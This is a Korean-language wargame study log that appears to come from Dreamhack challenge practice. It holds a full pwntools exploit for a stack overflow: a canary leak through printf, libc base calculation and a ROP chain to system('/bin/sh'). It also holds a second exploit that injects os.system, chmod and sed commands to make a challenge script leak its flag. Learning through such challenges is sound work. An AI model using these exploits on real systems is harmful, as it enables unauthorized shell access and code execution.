#### Week2

### [War Game] [minary]

gen_minary	로 만든 8바이트 값을 buf의 마지막 8바이트 영역에 저장

사용자가 quit을 입력하면 buf끝에 저장된 값이 처음 생성된 minary 값과 일치하는지 확인.

buf의 크기가 256바이트
read함수로 320바이트 입력

printf에서 %s 사용하는데 널 만날 때까지 출력하니까 248바이트 꽉 채워 입력하면 minary 값 출력 가능


더미 데이터 248바이트 채우고
minary leak 하고
rbp 8바이트 채우고 
ret자리의 main 주소 확보 
offset 이용해서 base 계산


pop rdi; ret : 0x1271	
system : 0x50d70
binsh : 0x1d8678
ret 오프셋 : Leaked Addr - Libc Base 했는데 0x29d90 나왔는데 보통 서버 표준 오프셋인 0x2a1ca로 수정해서 익스하니가 성공함. 

------------------------------------------------------expl.py-----------------------------------
from pwn import *

#p = remote("host8.dreamhack.games", 10828)
p = remote("127.0.0.1", 8080)
e = ELF('./prob')
libc = ELF('./libc.so.6')


payload = b'a' * 264
p.sendafter(b"Enter a string > ", payload)
p.recvuntil(b'a' * 264)
leaked_ret = u64(p.recv(6).ljust(8, b"\x00"))


system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))

#libc base
libc_base = leaked_ret - 0x2a1ca
print(f"[*] Libc Base: {hex(libc_base)}")
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

rop = ROP(libc)
pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
ret = libc_base + rop.find_gadget(['ret'])[0]

payload2 = b'a' * 264
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.sendafter(b"Enter a string > ", payload2)

p.sendafter(b"Enter a string > ", b"quit\x00")

p.interactive()





### [War Game] [문제 이름을 입력해주세요.]

단순하게 가지고 있는 chall.py에서 모든 권한을 부여해 제공되는 파이썬 스크립트 안의 주석을 제거한 다음 실행할 수 있게 만든다.
이후 chall.py를 한번 더 실행하고 flag를 leak하는 방법으로 단순하게 생각하면 됐는데 이걸 생각해내지 못해 문제 풀이하는데 시간이 오래 걸렸다.

------------------------------------------------------expl.py-----------------------------------

from pwn import *

#p = remote("host8.dreamhack.games", 13249)
p = remote("127.0.0.1", 5000)

payload = b"""import os; import time; os.system("chmod 777 chall.py"); os.system("sed -i 's/#print(result.stdout)/print(result.stdout)/g' chall.py"); os.system("python3 chall.py"); """

p.sendlineafter(b"Input > ", payload)

p.interactive()

